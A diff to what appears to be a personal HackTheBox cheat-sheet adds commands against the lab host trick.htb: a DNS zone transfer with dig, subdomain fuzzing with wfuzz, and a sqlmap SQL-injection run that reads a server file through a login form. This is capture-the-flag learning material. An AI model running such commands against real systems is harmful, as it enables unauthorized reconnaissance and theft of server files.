@@ -295,3 +295,13 @@ hex to bytes: bytes_value.hex()
 
 decrypting rsa with weak public key (when public key and encrypted text is given):
 python3 RsaCtfTool.py --publickey /home/saad/Desktop/hackthebox/challenges/crypto/weak_rsa/key.pub --uncipherfile /home/saad/Desktop/hackthebox/challenges/crypto/weak_rsa/flag.enc
+
+dns name server query:
+dig trick.htb axfr @10.10.11.166
+
+finding subdomains with a specific prefix value using wfuzz:
+sed 's/^/preprod-/' /home/kali/Documents/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt > mywordlist 
+wfuzz -c -w ./mywordlist -H "Host: FUZZ.trick.htb" -u 10.10.11.166 -t 100 --hl 83 
+
+sqlmap to read files from the system:
+sqlmap --url "preprod-payroll.trick.htb/ajax.php?action=login" --data "username=test&password=test" --file-read "/var/www/market/index.php" --batch
